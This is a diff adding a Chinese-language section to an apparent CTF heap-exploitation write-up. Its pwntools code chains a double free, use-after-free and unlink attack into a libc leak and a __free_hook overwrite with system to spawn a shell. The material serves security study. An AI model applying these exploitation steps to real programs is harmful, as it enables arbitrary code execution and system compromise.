@@ -639,3 +639,63 @@ int view()
 
 
 ## 实现
+
+
+  这里给出该漏洞利用的具体实现和细节说明
+
+  根据前面的分析，只要我们成功实现了**unlink攻击**，则后面的利用就很简单了。
+  总体上，我们首先需要一个可以修改数据的被释放掉的内存对象，即一个**double free**，其相关的代码如下所示
+  ```python
+	r.recvuntil('Whats your name?\n')
+	r.sendline('hawk')
+
+	r.recvuntil('Init your profile:\n')
+	r.sendline('hawk')
+
+
+	wp_take(r, 'hawk')
+	wp_buy(r, 'hawk')
+	
+
+	wp_dismiss(r)
+	wp_delete(r)			#this will call malloc_consolidate()
+	wp_dismiss(r)			#this is in fast bin
+```
+
+  当我们释放个人介绍之前(`wp_delete(r)`之前)，其内存布局就是一个简单的**fast bin**，如下所示
+  ![malloc_consolidate之前的内存布局](malloc_consolidate之前的内存布局.PNG)
+
+  当我们释放个人介绍之后，根据阅读glibc源代码可知，其会将个人介绍的内存对象释放掉，然后在调用`malloc_consolidate`，将**fast bin**的内存对象合并并放置在**unsorted bin**中，其内存布局如下所示
+  ![malloc_consolidate之后的内存布局1](malloc_consolidate之后的内存布局1.PNG)
+
+  为了可以更改该释放的内存对象，从而在其上按照前面的**unlink攻击**姿势伪造一个chunk，则我们利用**UAF**，再次释放课程，从而下次申请的时候直接获取该块，而在**unsorted bin**中的块保持不变，其再次执行`wp_dismiss(r)`语句后内存布局如下所示
+  ![malloc_consolidate之后的内存布局2](malloc_consolidate之后的内存布局2.PNG)
+
+
+  当我们完成**double free**之后，我们已经具备了**unlink攻击**的所需条件——**ptr**指针为**0x6020a8**;可以更改的释放的内存对象为**class**对象。则我们按照前面的姿势，在该可控的内存对象上伪造一个chunk，然后释放相邻的next chunk，实施**unlink攻击**即可，其攻击过程如下所示
+  ```python
+	class_got = 0x6020A8
+	wp_take(r, p64(0) + p64(0x31) + p64(class_got - 0x18) + p64(class_got - 0x10) + p64(0) * 2 + p64(0x30)[:7])	#cause fast bin don't change the next_use, and it change in the unsorted bin, so next_use still is 0, and its pre_size is usable, override it to the 0x30
+
+	wp_drop(r)	# this is a unlink attack, change the class_got[0] = class_got - 0x18
+```
+
+  前面在漏洞利用的时候已经说过了，由于**fast bin**在释放的时候为了避免合并，未修改其next chunk的prev_inuse字段，则其申请到释放后的chunk的话，自然也无需更改——这里申请后，book中的prev_inuse字段仍然为**malloc_consolidate**合并时设置的0，其伪造后的内存布局如下所示
+  ![伪造的内存布局](伪造的内存布局.PNG)
+
+  当我们释放书时，其检测到prev_inuse字段为0，会根据pre_size字段的值(已经覆盖为0x30)，合并prev chunk(在class上伪造的chunk)。这里稍微分析一下，就很容易发现伪造的chunk绕过了**unlink攻击**的检查，从而将**0x6020a8**处的值更改为**0x602090**，这样修改课程描述，就相当于向**0x602080**处写入数据，其**unlink攻击**后的内存布局如下所示
+  ![unlink攻击后的内存布局](unlink攻击后的内存布局.PNG)
+
+  同我们完成了**unlink攻击**后，我们可以通过修改book等的指针，从而实现任意地址的读写，那么获取shell就非常简单，其利用代码如下所示
+  ```python
+	wp_jump(r, p64(1) + p64(elf.got['free']) + p64(1) + p64(class_got - 0x18))
+	lib_base = u64((wp_view(r).split('\x7f')[0] + '\x7f').ljust(8, '\x00')) - lib.sym['free']
+	log.info('lib_base => %#x'%lib_base)
+
+
+	wp_jump(r, p64(1) + p64(lib_base + lib.search('/bin/sh').next()) + p64(1) + p64(lib_base + lib.sym['__free_hook']))
+	wp_jump(r, p64(lib_base + lib.sym['system']))
+	wp_drop(r)
+
+	r.interactive()
+```
